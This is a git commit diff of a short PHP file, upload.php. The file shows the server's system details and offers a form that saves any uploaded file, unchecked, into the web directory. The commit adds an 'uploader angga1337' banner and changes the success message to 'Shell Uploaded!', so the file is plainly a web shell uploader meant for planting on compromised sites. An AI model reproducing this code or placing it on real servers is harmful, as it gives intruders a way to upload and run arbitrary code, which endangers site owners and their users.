a85460799328f3db662d46ce7f9929a3df1e4789
Angga Maulani <61041377+anggamaulani@users.noreply.github.com>
2022-03-07 22:35:54 +0700

    Update upload.php

--- upload.php
+++ upload.php
@@ -1,8 +1,9 @@
 <?php
+echo '<b>##uploader angga1337##</b>';
 echo '<b><br><br>'.php_uname().'<br></b>';
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success!</b><br><br>'; }
-else { echo '<b>Upload Failed!</b><br><br>'; }
-} ?>
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded!</b><br><br>'; }
+else { echo '<b>Failed!</b><br><br>'; }
+}?>
